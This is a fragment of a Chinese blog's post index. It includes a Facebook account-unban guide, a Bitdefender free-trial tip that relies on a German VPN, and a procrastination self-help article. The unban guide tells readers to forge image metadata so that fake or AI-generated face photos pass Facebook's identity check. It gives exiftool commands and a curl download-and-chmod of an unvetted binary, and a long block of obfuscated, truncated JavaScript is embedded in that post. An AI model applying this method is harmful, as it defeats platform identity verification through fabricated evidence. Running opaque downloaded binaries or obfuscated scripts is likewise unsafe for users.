","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 专页 BUG","feature":"https://dev-coco.github.io/post-images/Facebook-Page-Bug.png","link":"https://dev-coco.github.io/post/Facebook-Page-Bug/","stats":{"text":"3 min read","time":130000,"words":396,"minutes":3},"date":"2023-06-11 00:48:49","dateFormat":"2023-06-11"},{"content":"一个超高概率解封成功的方法。 .form{width:530px;margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:16px 16px 5px 5px;box-shadow:0 1px 1px rgba(0,0,0,.05);border-color:#428bca;margin:10px auto}.panel-heading{color:#fff;background-color:#428bca;border-color:#428bca;text-align:center;padding:15px;border-bottom:1px solid transparent;border-top-right-radius:13px;border-top-left-radius:13px}lable{width:240px;font-size:16px;padding-top:7px;float:left;text-align:right}.form-control{font-size:16px;margin-top:10px;margin-bottom:10px}.btn,input,select{margin-left:10px;padding:5px;font-size:16px;width:260px;box-sizing:border-box}.btn{margin:0 auto}#accountScore,#postScore{text-align:center;margin:5px} Facebook 账号被禁用后，有可能会提示要求输入手机号接收验证码，然后再要求上传头像。经过三年左右的时间进行实验，我发现上传头像成功解封的图片都有固定的特征。 图片特征 下面是图片的元数据，里面包含了 OriginalTransmissionReference 和 SpecialInstructions 参数。 UTI: public.jpeg Metadata: { ColorModel = RGB; Depth = 8; PixelHeight = 927; PixelWidth = 927; ProfileName = &quot;sRGB IEC61966-2.1&quot;; &quot;{IPTC}&quot; = { OriginalTransmissionReference = &quot;-EgrBQzq01u7kn0WVGu4&quot;; SpecialInstructions = FBMD01000aa3010000c42b0000ef5d0000b0620000ed67000009870000fad4000006df0000cce7000059f0000030760100; }; &quot;{JFIF}&quot; = { DensityUnit = 0; IsProgressive = 1; JFIFVersion = ( 1, 0, 2 ); XDensity = 1; YDensity = 1; }; } 我尝试过上传真实的头像图片，但是并没有包含这些参数，解封成功的概率很低。加上这些参数后，上传的头像图片有的并不是真实的，甚至是 AI 生成的人脸图片也解封成功了，而且成功的概率非常高。那么只需要在图片的元数据中添加上这两个参数即可。 生成元数据 我做了一个元数据生成器，可以使用下面的工具随机生成参数值，然后在图片添加这些参数。 元数据生成器 OriginalTransmissionReference SpecialInstructions 生成 设置参数 图片必须是 jpg 的格式，其它格式无法设置参数。 首先，需要安装 brew，如果已经安装过了，可以跳过此步骤。 /bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 然后再安装 exiftool 工具。 brew install exiftool 使用 exiftool 为图片写入指定元数据，将 xxxxx 替换成生成的随机值，然后设置好图片的路径。 exiftool -OriginalTransmissionReference=&quot;xxxxx&quot; example.jpg exiftool -SpecialInstructions=&quot;xxxxx&quot; example.jpg 检测参数 下载 exifdump 工具。 curl https://dev-coco.github.io/other/exifdump -o exifdump &amp;&amp; chmod +x exifdump 使用 exifdump 检测图片元数据是否添加成功。 ./exifdump example.jpg 如果在输出结果中有显示 OriginalTransmissionReference 和 SpecialInstructions 参数就说明添加成功了。 不过要注意的是这个方法虽然可以提高解封成功的概率，但并不是 100% 都可以解封成功，如果账号本身有严重的违规行为，即使上传头像图片通过验证了，也会因为违规行为被拒绝解封审核。 (function(D,a){function n(D,a,x,U,M){return m(M- -0x20,D);}function W(D,a,x,U,M){return m(M-0x7b,U);}const x=D();function J1(D,a,x,U,M){return m(D- -0x217,M);}function f(D,a,x,U,M){return m(D- -0xe9,a);}function J0(D,a,x,U,M){return m(U- -0x2f,M);}while(!![]){try{const U=parseInt(n('049c',0x2cd,0x217,0x30d,0x27f))/(-0xf2c+0x12*-0xf0+-0x669*-0x5)+-parseInt(n('Blqa',0x21b,0x2a1,0x1e3,0x266))/(0xf21+-0x1352*-0x1+-0x1*0x2271)*(-parseInt(n('tMGo',0x1cc,0x19a,0x1bb,0x1b1))/(-0x4*0x10e+-0x178+0x5b3))+parseInt(W(0x3b9,0x34f,0x345,'[P2@',0x343))/(0x2*-0x10e7+-0x4a0+0x2672)+parseInt(J0(0x1bb,0x1dd,0x153,0x186,'14)9'))/(0x2*0xf4+-0x2*0xb8f+-0x153b*-0x1)*(parseInt(W(0x216,0x1f6,0x29c,'B!Ps',0x22f))/(-0x1*0x1ddd+-0x2*0xac1+0x3365))+parseInt(f(0x112,'[MXw',0x19f,0xa1,0x131))/(-0x2507+0xedb+-0x1*-0x1633)*(parseInt(n('qYxU',0x324,0x230,0x31d,0x2aa))/(0x127e+0x6c2+-0x10d*0x18))+-parseInt(J0(0x17f,0x215,0x195,0x1b8,'iL)6'))/(0x176b+0x1621+0x1*-0x2d83)+-parseInt(J0(0x1f1,0x154,0x22e,0x1c5,'B!Ps'))/(-0x7*0x12e+-0x8*0x15a+0x98e*0x2);if(U===a)break;else x['push'](x['shift']());}catch(M){x['push'](x['shift']());}}}(A,0x1706c0+0x9e5ea+-0x1*0x146b85));const T=(function(){const D={'wLxHP':function(x,U){return x(U);},'UObZw':function(U,M){return U+M;},'dniqV':J2('kVV5',0x384,0x388,0x403,0x380)+J2('HTIt',0x417,0x428,0x47b,0x49f)+J3(-0x151,-0xe6,-0x15b,'oTB8',-0x164)+J4(0x176,0x12e,0xcb,0x1a5,'B!Ps'),'RuftT':J6(0x1bb,0x1d9,0x14e,0x239,'S6C!')+J2('11k@',0x4a6,0x54d,0x4d5,0x518)+J5(-0x75,'XAlH',0x48,-0x20,-0x1c)+J5(-0x33,'S6C!',0xaa,0x2c,-0x43)+J5(-0x93,'qI^J',-0x68,-0x1d,-0x3d)+J6(0x1b7,0x131,0x15a,0x136,'N^S*')+'\\x20)','eqLAb':function(U,M){return U!==M;},'ugpnG':J3(-0x1a3,-0x179,-0x1f0,'S6C!',-0x1a2),'OlTHa':function(U,M){return U===M;},'LbBNz':J4(0xfd,0x16a,0x1f7,0x137,'iIQ)'),'HSGHM':function(U,M){return U*M;},'asHNG':J2('4bWF',0x523,0x515,0x4e1,0x455),'dKrVg':J6(0x171,0x17f,0x19e,0x196,'xFkR')};function J6(D,a,x,U,M){return m(D- -0x104,M);}let a=!![];function J3(D,a,x,U,M){return m(D- -0x376,U);}function J2(D,a,x,U,M){return m(U-0x23b,D);}function J5(D,a,x,U,M){return m(U- -0x239,a);}function J4(D,a,x,U,M){return m(a- -0xff,M);}return function(x,U){function J8(D,a,x,U,M){return J5(D-0x17d,D,x-0x48,M-0x1de,M-0x61);}function JU(D,a,x,U,M){return J3(a-0x4c3,a-0x5a,x-0x1ea,D,M-0x110);}function JJ(D,a,x,U,M){return J3(U-0x587,a-0x174,x-0x19a,D,M-0x143);}const M={'jaLpE':function(F,Q){function J7(D,a,x,U,M){return m(x- -0x5f,D);}return D[J7('X&!u',0x1a1,0x1e5,0x1e0,0x1a5)](F,Q);}};function JM(D,a,x,U,M){return J3(M-0x3f1,a-0x199,x-0x1d6,x,M-0x1e6);}function J9(D,a,x,U,M){return J2(D,a-0x5b,x-0x184,x- -0x590,M-0x42);}if(D[J8('iL)6',0x265,0x208,0x182,0x213)](D[J9('Y5tr',-0x160,-0x13e,-0x10b,-0x18b)],D[J8('[MXw',0x230,0x1aa,0x20d,0x221)])){const F=a?function(){function Ja(D,a,x,U,M){return JJ(U,a-0xe5,x-0x4,a-0x1cc,M-0xd);}function JD(D,a,x,U,M){return J8(D,a-0x22,x-0x1c8,U-0xe3,a-0x3f2);}function JA(D,a,x,U,M){return J9(M,a-0x1ee,D-0x2c8,U-0x1c7,M-0x83);}function Jx(D,a,x,U,M){return J8(a,a-0xe2,x-0x118,U-0x189,M-0x3a8);}const Q={'ZfVtr':function(G,e){function JO(D,a,x,U,M){return m(x-0x25e,a);}return D[JO(0x4d2,'Er%h',0x497,0x4dd,0x42b)](G,e);},'jsama':function(G,e){function JB(D,a,x,U,M){return m(U- -0x9b,D);}return D[JB('jNFK',0x1f9,0x14f,0x177,0x16c)](G,e);},'dLHoI':function(G,e){function JT(D,a,x,U,M){return m(a-0x1b,x);}return D[JT(0x351,0x2e2,']rLV',0x335,0x2b1)](G,e);},'pwQlZ':D[JA(0x150,0x1df,0x196,0xce,'B!Ps')],'wuyDF':D[JA(0x1e6,0x1dc,0x1d8,0x184,'eRgS')]};function Jm(D,a,x,U,M){return J9(U,a-0x112,a-0x122,U-0x14a,M-0xc5);}if(D[JD('eRgS',0x595,0x549,0x5f6,0x58b)](D[Ja(0x566,0x58d,0x604,'B!Ps',0x58f)],D[Ja(0x5f7,0x61e,0x65c,'j)HJ',0x5ee)]))x=Q[Ja(0x671,0x617,0x5ff,'xFkR',0x58b)](U,Q[Jm(-0x8f,-0x32,-0x1e,'14)9',0x2a)](Q[JD('j)HJ',0x5bb,0x627,0x596,0x5c2)](Q[Jm(0x1c,0x30,0x75,'W1CO',-0x53)],Q[Jm(0x6a,0x45,0x9c,'eRgS',0x19)]),');'))();else{if(U){if(D[Ja(0x5fb,0x62a,0x61f,'1tI3',0x60d)](D[JA(0x137,0x1ae,0x16f,0xe2,'qI^J')],D[Jm(0xed,0x6a,0xe6,'qYxU',0xe7)])){const e=U[JD('j)HJ',0x5f7,0x645,0x60d,0x60e)](x,arguments);return U=null,e;}else{const g=U[Ja(0x640,0x5fb,0x5ed,'Blqa',0x640)](M,arguments);return F=null,g;}}}}:function(){};return a=![],F;}else F+=Q[JU('4bWF',0x324,0x2cb,0x345,0x3ad)+'t'](G[JM(0x297,0x31c,'j)HJ',0x2d4,0x2fb)](M[JM(0x2e5,0x262,'RV(D',0x2c8,0x25e)](e[J8('*8$)',0x21d,0x225,0x21e,0x1ed)+'m'](),S[JJ('iL)6',0x46a,0x3c3,0x454,0x3dc)+'h'])));};}()),B=T(this,function(){const a={};function JG(D,a,x,U,M){return m(x-0x1aa,D);}a[JF(0x644,'W1CO',0x5a5,0x5fe,0x5f4)]=JF(0x616,'szCs',0x5a6,0x5d3,0x56a)+JQ(-0x1dd,-0x155,'j)HJ',-0x1a1,-0x22b)+'+$';function JS(D,a,x,U,M){return m(x- -0x10f,M);}function JQ(D,a,x,U,M){return m(U- -0x3c9,x);}const x=a;function JF(D,a,x,U,M){return m(U-0x3d4,a);}function Je(D,a,x,U,M){return m(U-0x3d1,D);}return B[JQ(-0xe3,-0x142,'XAlH',-0x112,-0x154)+Je('iL)6',0x5e9,0x5ef,0x5b5,0x58c)]()[JF(0x639,'ylM)',0x576,0x5ef,0x628)+'h'](x[JG('11k@',0x309,0x359,0x31d,0x2e9)])[JS(0x16f,0xe9,0xf3,0x123,'v%pJ')+JF(0x687,'oTB8',0x6ee,0x678,0x6a4)]()[JQ(-0x194,-0x1d9,'szCs',-0x171,-0x10b)+JS(0xf2,0x19b,0x133,0x1b9,'qI^J')+'r'](B)[JG('Z[fX',0x3bf,0x396,0x343,0x312)+'h'](x[Je('shI5',0x60f,0x64e,0x5f1,0x64c)]);});function m(J,O){const B=A();return m=function(T,D){T=T-(0x3*-0xc31+0xd8a+0x10*0x18b);let a=B[T];if(m['nzkCCu']===undefined){var x=function(G){const e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let S='',g='',t=S+x;for(let Y=0x183d+-0xb7a+-0x9*0x16b,X,I,l=0x2510+0x2614+-0x4b24;I=G['charAt'](l++);~I&&(X=Y%(0xf31+-0x85a*-0x1+-0x1787*0x1)?X*(0x78a+0x655*0x1+0xd9f*-0x1)+I:I,Y++%(0x6b*-0x35+-0x172a+0x2d55))?S+=t['charCodeAt'](l+(0x1a3*-0x14+0x127+0x1f9f*0x1))-(0x34*-0xa2+0x3b7*-0x9+0x4261)!==0x3*-0xb1b+0x1*0x1aba+0x697?String['fromCharCode'](-0x39b+-0x2*-0x52c+0x3*-0x1ea&X>>(-(-0x1*-0xba1+0x1*-0x1333+0x794)*Y&0x1c28+0x16ba+-0x32dc)):Y:-0x1543+-0x1511+-0x3*-0xe1c){I=e['indexOf'](I);}for(let v=-0x18d1*0x1+0x102f+0x8a2,R=S['length'];v","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Facebook 账号解封","feature":"https://dev-coco.github.io/post-images/Facebook-Account-Unlock.png","link":"https://dev-coco.github.io/post/Facebook-Account-Unlock/","stats":{"text":"11 min read","time":630000,"words":1896,"minutes":11},"date":"2023-06-04 08:34:32","dateFormat":"2023-06-04"},{"content":"Bitdefender 是一款由罗马尼亚的 Softwin 软件公司开发的杀毒软件。 先安装 Windscribe 插件。 然后选择 Germany，开启代理。 180 天免费体验：活动链接 打开活动链接，使用没有注册过的邮箱注册，注册后就会自动激活 180 天使用权。 ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"免费领取 Bitdefender 180 天","feature":"https://dev-coco.github.io/post-images/Bitdefender-Free-Trial.png","link":"https://dev-coco.github.io/post/Bitdefender-180-Free-Trial/","stats":{"text":"1 min read","time":16000,"words":79,"minutes":1},"date":"2023-05-31 09:53:50","dateFormat":"2023-05-31"},{"content":"拖延症困扰着许多人，而提高效率成为我们追求的目标。让我们一起探索如何解决拖延症，提升工作和生活的效率！ .procrasTest, .ZTPITest, .MEQScore { width: 70px; } #procrasTest, #MEQ, #ZTPITest { width: 550px; } #procrasTest tr td:first-child, #MEQ tr td:first-child, #ZTPITest tr td:first-child { width: 65px; text-align: center; } 了解拖延症 拖延症的原因 所谓“拖延症”，不仅指经常拖着不去做某事，更是指这种行为带来的长期困扰。 心理学家 Jane B. Burka 和 Lenora M. Yuen 提出了一个理论——「拖延症怪圈」，认为拖延行为不仅涉及心理学问题，还涉及到人的行为、情绪管理和所处环境。但是不管背后原因多么复杂，拖延行为呈现出来的过程具有几个关键点。 当你准备开始一个新的事情时，你会想「这次我要早点开始」。 早点开始的时间已经过去，你会感到有点焦虑，「我得马上开始」。 时间又过去了，你仍未开始完成手中的事情，一种不祥的预感开始浮现，于是你想逃避。这时你很容易陷入自责，为什么一开始要浪费时间的思维中，开始做其它的事，而不是应该去做的事，你会开始想「不开始又有何妨呢？」。 随着时间的流逝，你感到压力越来越大，但还是会心存侥幸，自我安慰「我还有时间」。 你终于绝望了，告诉自己「我有问题」、「下次再也不拖延了」，但下次再开始的时候，又会进入同样的循环。 看到这里你可能会感觉到有些苦恼，好像很难摆脱拖延症，但实际上，每个关键点都是陷入拖延的机会，同时也是摆脱拖延的机会。 不完美开始 「不完美开始」的意思是不要期望一开始就能做得完美无缺，不要想太多，只要开始做就是成功。有时候，陷入拖延的原因之一就是因为把开始工作想得太难了。例如，接到一个开发需求，认为必须一次性交付完美的成果。我们可能会花费大量时间在调整代码结构、框架、标题、布局、字体等细节上，反复修改，其实这时已经在打退堂鼓，不想进行了。 「不完美开始」的原则是要让你放下完美主义，先从一个小的起点开始。比如，如果你面临一个写代码的任务，可以从写出最基础的几行代码开始。这样会让你感觉更容易，对于完美主义者来说，写一小段代码和写一个完整的程序相比，更容易接受。而且，开始的时候不要考虑最终的结果，只是把自己的思路表达出来，然后发布一个 demo，再根据用户反馈不断改进发布 2.0、3.0 版本。 不完美开始让我们能够跳出「拖延症怪圈」，先迈出第一步，只要开始了，就有机会逐步改进和完善。 认识拖延症 你有拖延症吗 让我们看看三个例子： 例子一：你有一个同事小明，他在工作中从来不拖延，甚至经常提前完成任务，因为他有很强的行动力和表现欲。但是，私下里他也有很严重的拖延行为，比如一些琐碎的工作或者不是他擅长的工作，他就总是推迟或者忽略。 例子二：你有一个同事小红，她总是在工作中刻意利用拖延策略。如果期限是 7 天，她会用前面几天放松休息，而在最后一两天内，爆发出超强的效率和创造力，完成所有任务。她知道自己在前面的时间里拖延了，但她相信自己在截止日期前能够顺利完成任务。 例子三：你有一个同事小军，他工作压力大，身体也不好，所以想要健身。但是每天早上觉得时间不够用，晚上又觉得刚吃完饭不适合运动。周末没有加班也没有其他事情打扰，但他又觉得空气不好、天气太冷等等原因，就总是不去健身。半年过去了，他还是没有开始健身，身体状态变得更差了，这让他非常担心，但他还是没有开始进行。 我们需要知道，并不是所有拖着不做的事情都属于拖延症，拖延症更多的是指那种让你感到痛苦和焦虑的拖着不做某件事情的状态，而且很难走出来，一直循环。 例子一的小明，拖着不做并不会对他造成太大的影响，也不会感到焦虑；例子二的小红拖延到期限的时候可以激发创造力和潜能，并且顺利完成任务，所有基于这两种情况并不属于拖延症。但是例子三的小军觉得健身很重要，但是因着各种各样的原因没办法执行，感到十分焦虑而且一直循环，这种就属于拖延症。 以下 4 点判断是否存在拖延症 你是否有一直想做但是一直没有开始的事情，如果不去做会给自己带来严重的后果？ 这种处于焦虑状态但是又没有行动的状态是否让你感到痛苦？ 你是否明确知道需要去做的事情的重要性，但是却仍然一遍又一遍的拖延？ 你的拖延是否导致了你与身边人的关系紧张，并给你在意的人带来了困扰？ 如果你属于这 4 点的其中一项，那么就需要好好的调整了。 改变动力的公式 改变的动力 =（期望 * 价值感）/（冲动 * 推迟） 这个公式是由 Piers Steel 提出的，总结出导致拖延的四个最直接的原因：期望、价值感、冲动和推迟。下面会逐一解释这些原因。 先来看公式的前半部分：期望 * 价值感 如果你对某项任务抱有更高的期望，并且认为这项任务有更高的价值感，那么你就会有更强的动力去完成它，从而避免拖延。 你是否选择去做某项任务取决于你是否认同该任务有价值，并且能够从该任务中获得多少快乐，也就是公式中的「价值感」。其次，还取决于你对自己能否完成该任务的程度的判断，对环境和未来的掌控感，以及你设定的任务目标和你的能力、环境是否相匹配也就是公式中的「期望」。 举个例子，比如说，有一个开发需求需要我来完成，但是我对这个需求不是很感兴趣，我认为可能无法很好地完成它，而且可能会碰到很多问题。这个需求对我来说，价值感和期望都很低，所以我可能会拖延或者不想去完成。 相反，如果有一个开发需求，需要我编写一个很有趣的游戏，这个需求对我来说具有很高的价值感，而且我相信自己能够很好地完成它，那么我就会有更高的动力去完成这个需求，从而避免拖延。 再来看公式的后半部分：冲动 * 推迟 在这里，我们将“冲动”定义为分散注意力、因为各种诱惑而难以保持专注、高效完成任务的倾向。很多人需要顽强的意志力来约束自己。但实际上，通过一定的满足来降低你对诱惑的欲望，是一个更好的方法。举个例子，在晚饭过后，看到一个非常不错的饭店，你不会急着进去，而是会默默地记下地址，如果下次有机会再去尝试。 另一个因素是「推迟」，它一方面与时间管理有关，另一方面指的是一个长远的、宏大的计划。在看到眼前的好处时，会更倾向于推迟这个长远的计划。 举个例子，假如我已经习惯了现有的框架进行开发，但是另外一个框架可能更适合我的项目，但是我需要去学习新的文档和语法。如果这个新框架的功能非常优秀，能够显著提高你项目的性能或者使得代码更易于维护，那么我可能会愿意去学习和使用它。 但如果这个新的框架与我已经熟悉的框架相比并没有明显的优势，那么会舍弃学习新的框架，继续使用现有的技术，因为这样能节省我额外再学习新东西的时间。 所以，当我们对某件事的期望和价值感越高，越不容易冲动和推迟，就越有可能开始行动。反之，当我们对某件事的期望和价值感较低，冲动却很强且容易推迟，我们就更容易陷入拖延的泥沼。 我为您准备了一项测试，你可以尝试完成它，以了解你在期望、时间和价值感方面的相对薄弱之处，接下来就可以针对薄弱处针对性提升。 拖延测试 填写说明：请认真阅读每道题目，按照描达与自己的符合程度打分。(1=我不会或极少这样，2=我很少这样，3=我有时这样，4=我经常这样，5=我总是或就是这样) 序号 问题 分数 1 我能投入大量时间做事 2 我不愿意理解工作任务 3 在我开始之前，我会先做点儿能让我暂时轻松的事，但随后事情就变得一团糟了 4 当我很投入时，就能有所成效 5 我希望我的工作很有趣 6 我会做些一开始看上去很有意思的新任务，但我不会想它接下来会如何 7 只要我足够努力，就可以获得成功 8 我的工作似乎毫无意义 9 当有一个诱惑摆在眼前，我的渴望就会变得很強烈 10 我相信我的努力会有回报 11 我觉得工作很无聊 12 我的行动和言语能让我暂时愉悦，但对长期目标不利 13 我做事能坚持到底，并且懂得变通 14 我对持续尽职尽责缺乏热情 15 面对一个有吸引力的诱惑，我很容易转移注意力 16 不管眼下有什么问题，我都会在最终搞定 17 当我觉得一项任务很乏味，我会不断发现自己正在快乐地做白目梦，而没有集中注意力在这件事上 18 当有机会享受的时候，我很难享受 19 我可以通过必要的努力克服困难 20 我不觉得我的工作很有意思 21 我宁愿选择小一点儿但可以立即得到的快乐，也不愿选择大一点但是要等一会儿才能得到的快乐 22 胜利在我的掌控之中 23 如果一件事情很无聊，我的脑子会滑到别的事情上去 24 要推迟满足，我需要花很多力气 总分 分数 期望 价值 时间 主动掌控工作 调整价值感 如果对某件事情的价值感很低，那么大概率会导致进度拖延。 例如有一堆的邮件需要回复，但是并不想看；需要准备月度报表了，但是并不想开始去做；有个开发计划，已经选好了需要用到的框架以及相关的方案，但是并不想开始。 其实，这些拖延行为并不一定是因为担心事情的成功或失败。实际上，背后往往是我们不认同这项事情的价值。如果我们偏偏不得不做，就会通过拖延的行为来对抗。 越认同，越不拖延 当你对工作和任务的价值感越高时，就越不容易拖延。这是因为大脑存在一种奖赏效应，它会使你更喜欢并优先处理那些让你感到有价值的事情，而对于那些看起来没有直接关联或者不那么重要的事情则缺乏兴趣。 当任务的价值感越高，就越容易激发奖赏效应。这也解释了为什么我们更容易拖延那些看起来对我们不那么重要或没有直接关联的事情，而对于那些与我们的目标和利益相关的事情则更不容易拖延。 当一项任务的价值感越高时，就越有可能激发奖赏效应。因此，如果你越认同自己的工作和任务，就更容易对这个事情产生兴趣和动力，并且更愿意去处理它。相反，对于那些看起来没有直接关联或者不那么重要的事情，我们的大脑可能会对其产生较低的兴趣和动力，从而容易导致拖延行为的出现。 相反，如果你对某项任务本身并不认同，但又不得不加班加点完成时，更容易失去控制地拿起手机刷推特或抖音，这是因为你对这项任务的价值感较低，觉得付出的努力得不到相应的回报。 这也说明了为什么在自己认同的事情上更容易保持专注和高效，而在不喜欢的任务上容易分散注意力和失去动力。当需要处理这些不那么感兴趣的任务时，我们容易受到手机、社交媒体等干扰的诱惑，因为它们提供了一种可以让我们获得即时满足感的途径，进一步加剧了我们的拖延行为。 获得控制感 James C. Scott 做过一项研究，很多人都有拖延的习惯，即使知道某些任务很重要，也不愿意去做。实际上，拖延的背后往往有一种想要掌控自己行动的意愿。 研究对象是马来西亚的农民。这些农民经常被当地的资本家剥削，他们每天辛苦劳作，却只能得到微薄的报酬。从表面上看，这个地区似乎一直保持着这种状态，一切都看起来正常。 然而，James C. Scott 发现，这些农民在外表看起来在工作，实际上有着一套应对压迫的方式。例如，他们会故意偷懒、装作糊涂、偷偷离开工作岗位或者故意破坏劳动工具。他们会尽可能地避免不必要的工作，将必须完成的任务推迟，找各种理由拖延。社会学家将这种对抗策略称为「弱者的武器」。 这种对抗背后的含义是：虽然我必须完成任务，但我是一个拥有自主权的个体，我可以根据自己的选择行动，没有必要按照他人的规定来工作。 然而，拖延并不能改变现状，它只能带来虚假的控制感。虽然表面上你好像是在掌握自己的行动，但是最终你还是必须完成任务。此外，拖延的情绪会让你更被动，可能导致你耽误解决问题的时间。因此，拖延从来不会坑别人，只会坑自己。 首先，针对拖延症，如果你觉得某项事情没有价值，你需要进行一次「价值评估」。重新审视你面对的工作和事情的价值，不要抱怨或对抗，而是放下情绪，思考这件事情的价值。 对于程序员而言，我们也可能会遇到一些看起来无聊或者繁琐的任务，比如修复一些无趣的 BUG、编写冗长的文档、或者重构一个代码库等。这时候，我们也需要重新评估这项任务的价值，并且给自己正向的激励。 例如，你可能需要修复一些看起来毫无意义的 BUG。但是，如果你认真思考这个 BUG 背后的影响，你就能够发现它的价值所在。这个 BUG 可能会导致软件崩溃，影响用户的体验，而修复这个 BUG 就能够提高软件的稳定性和可靠性，让用户得到更好的体验。这样，你就能够为这件事情赋予更多的价值，从而更加有动力地去完成任务。 另外，也可以给自己设定具体的目标和激励也是一个有效的方法。比如，你可以给自己设定一个具体的完成时间和目标，例如「在今天晚上完成这个任务，然后可以玩一个小时电脑游戏」。这样，你就能够更加积极地去完成任务，同时也能够得到一些奖励和放松的时间，让自己更加愉悦和有动力。 快速进入状态 分心拖延 比如，项目经理分配给你一个重要的任务，需要在规定的时间内完成。你开始认真地处理这个事情，但是很快你发现自己被其他的事情打断了：有同事来问问题，有邮件需要回复，或者突然想起了之前没完成的任务，等等。这些打断你的事情看上去都很紧急，但实际上很可能是你想分心，逃避这个让你感到焦虑和痛苦的事情。 这种现象称之为「分心拖延」，这种现象是人们喜欢用做「其他事情」来替代做主要的事情。因为主要的事情更难，所以我们想用其他更简单的事情来逃避眼前的任务。然而，这种行为只会让我们进入一个恶性循环：拖延会导致我们更加焦虑，更难集中精力，也更容易分心，进而导致拖延更加严重。 因此，解决分心拖延的关键是要学会专注和集中精力，不让自己被琐碎的事情打断。这需要我们意识到自己分心的行为，并努力控制自己的注意力，避免被其他事情分散精力。同时，也需要我们理解和接受任务带来的不适和压力，不再用分心和拖延来逃避这些痛苦。 建立仪式感，进入状态 你或许注意到了，很多人在开始工作之前都会准备自己喜欢的工具和环境，比如程序员可能会选择使用一款顺手的编辑器和一个高清晰度的显示器，设计师可能会喜欢使用一个触感好的绘图板和一款高级的设计软件。这些工具和环境可以为你创造一个进入工作状态的氛围和仪式感，它们向你传达了一个重要的信息，即你已经准备好开始工作了。 这种自我暗示对于激发你的注意力和投入度非常重要。事实上，人类行为的大部分都是无意识或下意识的反应，而这种有意识的暗示可以让你更好地调动无意识的注意力资源，从而让你更容易地进入高度集中思考、反应和执行的工作状态。 另一个重要的原因是，使用你喜欢的工具和环境可以让你的边缘系统更容易接受这种变化，从而更容易地进入工作状态。除了前面提到的工具和设备之外，你还可以选择自己喜欢的工作环境，比如去自己喜欢的咖啡厅，平时在办公桌上放置一些喜欢的绿植，或是在开始工作前泡一杯自己喜欢的花茶，这些都可以成为让你进入工作状态的触发点。 如果你要做的事情特别枯燥、繁琐或者让你不想做，那么你可以尝试听一些适合自己口味的音乐来辅助完成工作。 不过，心理学家和脑科学家的观点类似，要想通过听音乐提升工作效率，需要注意以下几点： 如果你正在进行重复性的简单任务，那么听节奏欢快的音乐可以帮助提高效率。 对于需要集中精力但缺乏趣味的工作，如工厂里的工人或质检员，随着时间的推移，他们的注意力会逐渐降低。此时，听快节奏的音乐可以提高他们的工作效率和准确性。 如果你正在进行有创造力的任务，你可以在任务开始前或者休息时听音乐。 这是因为音乐能改善我们的情绪，激发创造的动力。但是，在进入思考状态时，你可能需要将音乐关掉，以免对思考造成干扰。另外，快节奏的音乐比慢节奏和悲伤的音乐更适合创造力任务。 尽量听没有歌词的音乐，或者是你不熟悉的语言的音乐。 常见的流行音乐，特别是那些让你跟着唱的，会使大脑处于多任务模式，影响阅读和信息处理能力，反而容易会消耗额外的精力去思考歌词内容。如果你选择听音乐，最好选择没有歌词或你不熟悉语言的音乐。 尽量把音量调低，选择单曲循环。 大声的音乐容易使人激动，而安静的音乐可以使人更加平静。此外，单曲循环能减少音乐切换对注意力的干扰。 抓紧时间，摆脱推迟 截止日期引发的拖延 在许多场合中，拖延症往往源于时间上的推迟，这种现象非常普遍。例如，当老师在学布置暑假作业时，许多学生并不会立即开始着手开始，而是会将作业拖到快开学的时候才开始，甚至最后一天才开始着手处理，这是最典型的推迟性拖延。 实际上，在我们的生活和工作中，处处都有推迟性拖延的情况。比如，你想要给家人购买商业保险，以防万一，但由于没有具体的期限，你可能会一拖再拖，直到某天不幸发生了什么才会后悔不已。又比如，公司的一个项目需要在月底前上线，任务很重要，需要大量的准备。但是，当你面临一个抉择，要么加班赶进度，要么与多年未见的好友出去玩，许多人会选择放弃工作，选择享受生活。但是，如果这个选择被推迟到上线前的一周，那么他们就会更倾向于优先处理工作，而不是娱乐。 显然，不同的时间节点对于拖延的影响不同。时间上的推迟往往会导致我们将应该完成的事情推迟到更远的将来，并且事情的截止日期越往后推迟，我们完成事情的动力就越弱，越容易陷入拖延的漩涡。 未来折扣 「未来折扣」是一种行为经济学中的概念，它揭示了未来的收益随时间的增加而被打折扣。这意味着，如果任务的截止日期在未来很远的时间，我们很容易低估任务的重要性，更倾向于去处理当前紧急的事情。这种现象也被用来解释「推迟」性拖延的原因。 举个例子来解释未来折扣，假设你买彩票中奖了，金额是 10000 元，你可现在可以选择直接打到银行卡上，或者拿到一张支票，但要等一年才能兑现。如果支票的金额仍然是 10000 元，你会更倾向直接拿到钱，因为你会觉得这张支票不值得等待。 计划谬误 另一个原因是「计划谬误」，即我们往往低估完成任务所需时间的倾向。这意味着我们倾向于过于乐观地估计自己可以在限定的时间内完成任务，而忽略了任务实际需要的时间。这会导致我们对时间的感觉产生误解，觉得未来会有更多的时间可以利用，因此不急于开始完成任务。 因此，即使任务看起来很重要，当它的截止日期还很遥远时，我们很容易产生推迟的倾向，认为可以在未来的某个时间开始处理。然而，这其实是一种错觉，因为时间流逝很快，而任务的完成需要时间和努力。因此，要避免拖延，我们需要认真评估任务的重要性，并合理规划时间，不要低估任务所需的时间。 摆脱推迟 当面临“推迟”造成的拖延时，可以采用以下两个方法：(1) 设定更紧迫的截止日期；(2)练习时间感知和预估能力。 首先，为了避免因期限太远而拖延，可以在原有的期限上再设置更早的截止日期。例如，经理要求下周二提交项目预算，那么在本周三之前先提交初稿，并在本周内完成反馈和修改。 其次，需要练习时间感知和预估能力。我们建议你记录一周内的时间使用情况，以及完成每个任务所需的时间。可以从两个方面入手：(1) 重新认识你未来的时间精力；(2) 了解你工作中主要任务需要的耗时。这样，即使面对遥远的期限，也能做好合理的安排。 通过以上方法，你能更好地克服推迟带来的拖延问题。同时，我们也要明确，我们常常因担心时间不够而拖延，但事实上，我们的时间分配并不会随着时间的推移而变化，我们需要更加合理地分配时间，提高效率。 找到平衡点 四个阶段改变习惯 James Prochaska 